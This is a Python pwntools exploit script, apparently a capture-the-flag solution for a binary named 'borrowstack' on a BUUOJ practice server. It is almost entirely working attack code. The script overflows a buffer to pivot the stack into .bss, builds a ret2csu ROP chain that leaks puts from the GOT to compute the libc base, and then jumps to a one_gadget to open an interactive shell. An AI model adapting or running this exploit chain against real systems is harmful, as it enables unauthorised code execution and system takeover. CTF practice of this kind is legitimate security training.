#coding:utf-8

from pwn import *

context.log_level = 'debug'
debug = 1

def exp(debug):
	elf = ELF('./borrowstack')
	lib = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
	if debug == 1:
		r = process('./borrowstack')
		#gdb.attach(r, 'b *0x00000040069A')
		#r = gdb.debug('./borrowstack', 'b *0x000000000040068F')
	else:
		r = remote('node3.buuoj.cn', 26597)
		
	
	r.recvuntil('\n')

	one_gadget = 0x4526a
	r.send('a' * 0x60 + p64(0x0000000000601080 + 0x8 * 9 - 0x8) + p64(0x0000000000400699))

	r.send(p64(0) * 9 + p64(0x0000000000400703) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x0000004006FA) + p64(0) + p64(1) + p64(0x000000000601028) + p64(0x200) + p64(0x601080 + 0xa0 - 0x8) + p64(0) + p64(0x000004006E0))
	r.recvuntil('\n')
	libc = u64(r.recvuntil('\n')[:-1].ljust(8, '\x00')) - lib.sym['puts']
	log.info('lib \'s address => %#x'%libc)
	r.send(p64(libc + one_gadget) + p64(0) * 10)
	r.interactive()

exp(debug)
